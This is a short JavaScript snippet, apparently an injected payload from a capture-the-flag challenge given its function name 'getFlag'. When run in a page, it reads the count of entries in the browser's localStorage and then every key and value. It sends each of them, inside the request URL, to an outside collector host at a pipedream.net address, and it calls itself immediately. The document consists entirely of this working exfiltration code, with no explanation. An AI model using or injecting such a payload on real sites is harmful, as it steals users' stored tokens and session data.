async function getFlag() {
            var local_length = window.localStorage.length;
            fetch('https://eoctl0knzoys9l9.m.pipedream.net/localstroge/length/' + local_length);
            for (let i = 0; i < local_length; i++) {
                fetch('https://eoctl0knzoys9l9.m.pipedream.net/localstroge/key/' + window.localStorage.key(i));
                fetch('https://eoctl0knzoys9l9.m.pipedream.net/localstroge/value/' + window.localStorage.getItem(window.localStorage.key(i)));
            }

        }
        getFlag()
